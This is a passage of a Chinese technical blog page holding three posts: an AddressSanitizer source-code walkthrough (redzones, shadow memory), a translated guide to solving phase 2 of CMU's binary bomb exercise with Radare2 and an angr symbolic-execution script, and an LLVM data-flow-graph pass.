<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> a[<span class="number">8</span>];</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>插桩后的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> redzone1[<span class="number">32</span>];  <span class="comment">// 32-byte aligned</span></span><br><span class="line">  <span class="keyword">char</span> a[<span class="number">8</span>];          <span class="comment">// 32-byte aligned</span></span><br><span class="line">  <span class="keyword">char</span> redzone2[<span class="number">24</span>]; </span><br><span class="line">  <span class="keyword">char</span> redzone3[<span class="number">32</span>];  <span class="comment">// 32-byte aligned</span></span><br><span class="line">  <span class="keyword">int</span>  *shadow_base = MemToShadow(redzone1);</span><br><span class="line">  shadow_base[<span class="number">0</span>] = <span class="number">0xffffffff</span>;  <span class="comment">// poison redzone1</span></span><br><span class="line">  shadow_base[<span class="number">1</span>] = <span class="number">0xffffff00</span>;  <span class="comment">// poison redzone2, unpoison 'a'</span></span><br><span class="line">  shadow_base[<span class="number">2</span>] = <span class="number">0xffffffff</span>;  <span class="comment">// poison redzone3</span></span><br><span class="line">  ...</span><br><span class="line">  shadow_base[<span class="number">0</span>] = shadow_base[<span class="number">1</span>] = shadow_base[<span class="number">2</span>] = <span class="number">0</span>; <span class="comment">// unpoison all</span></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="动态运行库"><a href="#动态运行库" class="headerlink" title="动态运行库"></a>动态运行库</h3><p>在动态运行库中将malloc/free函数进行了替换。在malloc函数中额外的分配了Redzone区域的内存，将与Redzone区域对应的影子内存加锁，主要的内存区域对应的影子内存不加锁。</p>
<p>free函数将所有分配的内存区域加锁，并放到了隔离区域的队列中(保证在一定的时间内不会再被malloc函数分配)。</p>
<h2 id="AddressSanitizer源码分析"><a href="#AddressSanitizer源码分析" class="headerlink" title="AddressSanitizer源码分析"></a>AddressSanitizer源码分析</h2><p>AddressSanitizer主要有三种层面的变量：Stack Variable(局部变量)，Global Variable, Heap Variable。由于每种变量的生命周期（life time)不同，所以对不同种类的变量处理也是不同的。下面分别从Global Variable，Stack Variable，Heap Variable三个层次来分析AddressSanitizer源码的逻辑结构。</p>
<h3 id="Global-Variable"><a href="#Global-Variable" class="headerlink" title="Global Variable"></a>Global Variable</h3><p>Global Variable存放在程序的数据段。在该算法的实现过程中，处理GlobalVariale的是AddressSanitizerModule类，该类继承自llvm的ModulePass，所以我们先看一下AddressSanitizerModule类的runOnModule(Module &amp;M)方法的处理过程，该过程首先进行一些初始化，然后我们可以看到对Global的插桩方法InstrumentGlobals()方法。</p>
<p><img src="/2017/07/26/AddressSanitizer/runOnModule.png" alt="runOnMoudle"></p>
<center> 图2： RunOnModule </center>

<p>在InstrumentGlobals()方法中，主要是分成两步：首先，重新声明一个GlobalVariable，这个GlobalVariable包含以前的GlobalVariable和一个RedZone；然后，调用runtime-library将新声明的这个GlobalVariable的RedZone区域加锁。我们先来看第一步的具体实现，如图3所示。</p>
<p><img src="/2017/07/26/AddressSanitizer/instrument_global.png" alt="instrumentGlobal"></p>
<center> 图3： 生成包含RedZone的新的GlobalVariable </center>

<p>下面，我们首先看一下一个Struct结构，该结构记录GlobalVariable存储的首地址，数据的大小，Redzone的大小，Module的名字等信息，便于在Runtime-library中使用。该结构在AddressSanitizerModule和runtime-library中都有相应的定义：</p>
<p><img src="/2017/07/26/AddressSanitizer/posionGlobal_struct.png" alt="poisonGlobal"><br><img src="/2017/07/26/AddressSanitizer/poisonGlobal_runtimeStruct.png" alt="poisonGlobalRuntime"></p>
<p>然后我们可以看到对GlobalVariable进行插桩来实现RedZone的Poison和整个GlobalVariable的Poison操作。</p>
<p><img src="/2017/07/26/AddressSanitizer/instrumentGlobal_actural.png" alt="instrumentGlobal_actural"><br><img src="/2017/07/26/AddressSanitizer/register_unregisterGlobal.png" alt="register_unregisterGlobal">  </p>
<p>具体的Poison RedZone和Poison GlobalVariable的实现在Runtime-library中：<br><img src="/2017/07/26/AddressSanitizer/Register.png" alt="RegisterGlobal"><br><img src="/2017/07/26/AddressSanitizer/unregisterGlobal.png" alt="UnRegisterGlobal"></p>
<h3 id="Stack-Variable"><a href="#Stack-Variable" class="headerlink" title="Stack Variable"></a>Stack Variable</h3><p>Stack Variable保存在栈区，在栈中的数据我们需要控制好变量的声明周期(lifetime),当调用一个函数时，会开辟一个栈，栈中的数据会有相应的redzone和shadow memory，并将redzone的shadow memory Poison，当函数结束（正常返回，异常），栈被销毁，需要将数据和redzone清空，其相应的shadow memory也要UnPoison掉。</p>
<p>对于Stack Variable，AddressSanitizer算法中实现了AddressSanitizer类，该类是继承了llvm的FunctionPass，该Pass能够处理每一个函数，在处理每个函数的时候，处理每一个load，store等能够访问内存的指令，在这些指令执行前进行插桩，看其访问的内存是不是被poison。</p>
<p>下面我们主要看一下AddressSanitizer::runOnFunction(Module &amp;M)函数中主要的插桩过程。</p>
<p><img src="/2017/07/26/AddressSanitizer/stack_instrument.png" alt="stackInstrument"></p>
<p>在每次访问内存时，都会查看影子内存的值，看其是否是0，如果是0则表示都能访问具体的插桩在instrumentMop函数中，</p>
<p><img src="/2017/07/26/AddressSanitizer/instrumentMop.png" alt="instrumentMop"></p>
<p>其中具体的处理过程在instrumentAddress函数中：</p>
<p><img src="/2017/07/26/AddressSanitizer/doInstrument.png" alt="instrumentAddress"></p>
<h3 id="Heap-Variable"><a href="#Heap-Variable" class="headerlink" title="Heap Variable"></a>Heap Variable</h3><p>Heap Variable保存在堆区，其分配的函数是malloc函数，该部分的主要代码在runtime-library中，该库中主要是先将malloc的库函数hook住，然后自己定义malloc函数，定义分配策略。</p>
<p><img src="/2017/07/26/AddressSanitizer/hookFunction.png" alt="hookFunction"></p>
<p>具体的分配策略定义在compiler-rt/lib/asan/asan-allocator.cc文件中，感兴趣可以看一下。</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2017/06/20/angr-bomb/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="binpang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PCB博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2017/06/20/angr-bomb/" class="post-title-link" itemprop="http://bin2415.github.io/page/2/index.html">使用angr和Radare解决CMU的二进制炸弹</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-06-20 18:05:53" itemprop="dateCreated datePublished" datetime="2017-06-20T18:05:53+08:00">2017-06-20</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-12-23 13:33:53" itemprop="dateModified" datetime="2018-12-23T13:33:53+08:00">2018-12-23</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/angr/" itemprop="url" rel="index"><span itemprop="name">angr</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在学习angr的使用，主要是如何利用angr来进行符号执行分析。发现了国外一篇比较实用的文章介绍如何使用angr和Radare(二进制分析框架)来分析CMU的二进制炸弹问题。故在此翻译一下<a href="http://ctfhacker.com/ctf/python/symbolic/execution/reverse/radare/2015/11/28/cmu-binary-bomb-flag2.html" target="_blank" rel="noopener">这篇文章</a>的工作。</p>
<h3 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h3><p>angr是一个使用python语言编写的二进制分析框架，它主要是进行静态和动态的符号分析，现已成为CTF比赛的一大利器。angr最主要的一个工具就是符号执行，具体的符号执行可以参考<a href="https://www.youtube.com/watch?v=mffhPgsl8Ws" target="_blank" rel="noopener">MIT的一个课程</a>(需要梯子才可以观看)。</p>
<h3 id="Radare2"><a href="#Radare2" class="headerlink" title="Radare2"></a>Radare2</h3><p>radare2是从零开始重写radare，以便提供一组库和工具来处理二进制文件。</p>
<p>在这篇文章里是先用的Radare2对二进制炸弹进行分析，弄清二进制文件的逻辑关系，然后再用angr的符号执行工具解出答案。关于radare2工具的介绍可以参考<a href="https://radare.gitbooks.io/radare2book/content/" target="_blank" rel="noopener">Radare2 Book</a></p>
<h3 id="所面临的问题"><a href="#所面临的问题" class="headerlink" title="所面临的问题"></a>所面临的问题</h3><p>要用angr和radare2所解决的问题是<a href="https://csapp.cs.cmu.edu/3e/bomb.tar" target="_blank" rel="noopener">CMU的二进制炸弹</a>，我们在此只分析phase2部分，如果对其他部分有兴趣的话可以参考我的<a href="http://blog.binpang.me/2017/05/16/Bomb/" target="_blank" rel="noopener">另一篇博客</a>对二进制炸弹做了全面的分析。phase2主要是要求输入6个正确的数字。</p>
<h2 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h2><h3 id="Radare2分析"><a href="#Radare2分析" class="headerlink" title="Radare2分析"></a>Radare2分析</h3><ol>
<li><p>使用Radare2加载程序，并输入aaa开始分析二进制程序<br><img src="https://ooo.0o0.ooo/2017/06/20/5949089e4fb62.png" alt=""></p>
</li>
<li><p>首先利用Radare2中的工具afl来查找符合条件的函数。使用afl并且grep(使用符号~来代表)筛选关键字, 可以看到筛选结果中有phase2。<br><img src="https://ooo.0o0.ooo/2017/06/20/594909adcb430.png" alt=""></p>
</li>
<li><p>使用seek工具来定位到我们感兴趣的函数处，此处为sym.phase_2函数。并用pdf([p]rint [d]issembly of [f]unction)命令来展示该函数的内容。<br><img src="https://ooo.0o0.ooo/2017/06/20/59490a845a6db.png" alt=""></p>
</li>
<li><p>如何要展示函数中的控制流程图可以在Radare2中使用VV（两个大写的V）指令。<br><img src="https://ooo.0o0.ooo/2017/06/20/59490b3ce8e98.png" alt=""></p>
</li>
<li><p>为了进行符号执行，我们必须弄清楚程序的输入是什么，通过radare工具反汇编出来的代码可以看出，函数read_six_numbers很有可能就是处理输入的函数。<br><img src="https://ooo.0o0.ooo/2017/06/20/59490ca528d44.png" alt=""></p>
</li>
<li><p>在radare2中使用ga指令进入read_six_numbers函数, 具体的函数代码如下所示：<br><img src="https://ooo.0o0.ooo/2017/06/20/59491342ec7ac.png" alt=""></p>
</li>
</ol>
<p>可以看出该函数中以六个数字作为scanf函数的输入，所以我们就将此作为输入。</p>
<ol>
<li>接下来我们需要分析符号执行所需要开始的代码处，符号执行不能走的路径以及要到达的目标代码处。<br><img src="https://ooo.0o0.ooo/2017/06/20/59492f1f0be19.png" alt=""><br>从上图可以看出0x400f10和0x400f20处的代码都调用explode_bomb函数。</li>
</ol>
<p><img src="https://ooo.0o0.ooo/2017/06/20/5949301b20e05.png" alt=""><br>具体的explode_bomb函数如上图所示，我们可以看出该函数会调用exit函数，所以我们要避免走到explode_bomb函数中去。即避免走到0x400f10和0x400f20。<br>要到达的目标函数我们可以设置到从phase2函数中返回。我们将调用完read_six_numbers函数后一条指令即0x400f0a作为程序分析的开始处。</p>
<h3 id="angr分析"><a href="#angr分析" class="headerlink" title="angr分析"></a>angr分析</h3><p>具体的angr分析代码如下所示：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Binary found here: http://csapp.cs.cmu.edu/3e/bomb.tar</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr, logging</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proj = angr.Project(<span class="string">'bomb'</span>, load_options=&#123;<span class="string">'auto_load_libs'</span>:<span class="keyword">False</span>&#125;)</span><br><span class="line"></span><br><span class="line">    logging.basicConfig()</span><br><span class="line">    logging.getLogger(<span class="string">'angr.surveyors.explorer'</span>).setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">nop</span><span class="params">(state)</span>:</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    bomb_explode = <span class="number">0x40143a</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Start analysis at the phase_2 function after the sscanf</span></span><br><span class="line">    state = proj.factory.blank_state(addr=<span class="number">0x400f0a</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Sscanf is looking for '%d %d %d %d %d %d' which ends up dropping 6 ints onto the stack</span></span><br><span class="line">    <span class="comment"># We will create 6 symbolic values onto the stack to mimic this</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">6</span>):</span><br><span class="line">        state.stack_push(state.se.BVS(<span class="string">'int&#123;&#125;'</span>.format(i), <span class="number">4</span>*<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Attempt to find a path to the end of the phase_2 function while avoiding the bomb_explode</span></span><br><span class="line">    path = proj.factory.path(state=state)</span><br><span class="line">    ex = proj.surveyors.Explorer(start=path, find=(<span class="number">0x400f3c</span>,),</span><br><span class="line">                                 avoid=(bomb_explode, <span class="number">0x400f10</span>, <span class="number">0x400f20</span>,),</span><br><span class="line">                                 enable_veritesting=<span class="keyword">True</span>)</span><br><span class="line">    ex.run()</span><br><span class="line">    <span class="keyword">if</span> ex.found:</span><br><span class="line">        found = ex.found[<span class="number">0</span>].state</span><br><span class="line"></span><br><span class="line">        answer = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">            curr_int = found.se.any_int(found.stack_pop())</span><br><span class="line"></span><br><span class="line">            <span class="comment"># We are popping off 8 bytes at a time</span></span><br><span class="line">            <span class="comment"># 0x0000000200000001</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># This is just one way to extract the individual numbers from this popped value</span></span><br><span class="line">            answer.append(str(curr_int &amp; <span class="number">0xffffffff</span>))</span><br><span class="line">            answer.append(str(curr_int&gt;&gt;<span class="number">32</span> &amp; <span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">' '</span>.join(answer)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> main() == <span class="string">'1 2 4 8 16 32'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(main())</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2017/05/20/llvm-DFG/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="binpang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PCB博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2017/05/20/llvm-DFG/" class="post-title-link" itemprop="http://bin2415.github.io/page/2/index.html">llvm:Data Flow Graph</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2017-05-20 18:36:06" itemprop="dateCreated datePublished" datetime="2017-05-20T18:36:06+08:00">2017-05-20</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-12-23 13:33:53" itemprop="dateModified" datetime="2018-12-23T13:33:53+08:00">2018-12-23</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/llvm/" itemprop="url" rel="index"><span itemprop="name">llvm</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Data-Flow-Graph"><a href="#Data-Flow-Graph" class="headerlink" title="Data Flow Graph"></a>Data Flow Graph</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>Data Flow Graph又叫数据流程图，表示在一个函数中的数据流动的方向。比如一个指令1定义了一个新变量%a,而另一个指令2用到了变量%a，此时就存在从指令1到指令2的边。llvm IR的表示形式是SSA，简单的来说SSA表示形式就是一个变量只能定义一次。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = y + <span class="number">1</span>;</span><br><span class="line">x = y + <span class="number">2</span>;</span><br><span class="line">y = <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<p>上面的形式就不是SSA的表示形式，因为x被定义（赋值）了两次，可以通过修改使其变成SSA的表示形式：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x1 = y + <span class="number">1</span>;</span><br><span class="line">x2 = y + <span class="number">2</span>;</span><br><span class="line">y = <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>在具体的实验中，我们遍历函数中的每一个指令，判断该指令是否为load，store指令，把load和store指令与其他指令区别开来是因为在IR中只有store和load指令直接与内存直接接触。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">                  <span class="keyword">case</span> llvm::Instruction::Load:</span><br><span class="line">&#123;</span><br><span class="line">	LoadInst* linst = dyn_cast&lt;LoadInst&gt;(curII);</span><br><span class="line">	Value* loadValPtr = linst-&gt;getPointerOperand();</span><br><span class="line">	edges.push_back(edge(node(loadValPtr, getValueName(loadValPtr)), node(curII, getValueName(curII))));</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> llvm::Instruction::Store: &#123;</span><br><span class="line">	StoreInst* sinst = dyn_cast&lt;StoreInst&gt;(curII);</span><br><span class="line">	Value* storeValPtr = sinst-&gt;getPointerOperand();</span><br><span class="line">	Value* storeVal = sinst-&gt;getValueOperand();</span><br><span class="line">	edges.push_back(edge(node(storeVal, getValueName(storeVal)), node(curII, getValueName(curII))));</span><br><span class="line">	edges.push_back(edge(node(curII, getValueName(curII)), node(storeValPtr, getValueName(storeValPtr))));</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于其余的指令，遍历每一个指令的操作数，判断其是不是一个指令，如果是指令的话，就添加相应的边。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Instruction::op_iterator op = curII-&gt;op_begin(), opEnd = curII-&gt;op_end(); op != opEnd; ++op)</span><br><span class="line">							&#123;</span><br><span class="line">								Instruction* tempIns;</span><br><span class="line">								<span class="keyword">if</span> (dyn_cast&lt;Instruction&gt;(*op))</span><br><span class="line">								&#123;</span><br><span class="line">									edges.push_back(edge(node(op-&gt;get(), getValueName(op-&gt;get())), node(curII, getValueName(curII))));</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br></pre></td></tr></table></figure>
<p>具体代码请参考<a href="https://github.com/bin2415/llvm_DFGPass" target="_blank" rel="noopener">我的github</a></p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">binpang</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">32</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">15</span>
                    <span class="site-state-item-name">categories</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">29</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          

          
          

          
            
          
          

        </div>
      </div>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">binpang</span>

  

  
</div>


  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v6.6.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  
    <script src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  


  


  <script src="/js/src/utils.js?v=6.6.0"></script>

  <script src="/js/src/motion.js?v=6.6.0"></script>



  
  

  

  


  <script src="/js/src/bootstrap.js?v=6.6.0"></script>



  



  











  





  

  

  

  

  

  
  

  

  

  

  

  

  

</body>
</html>
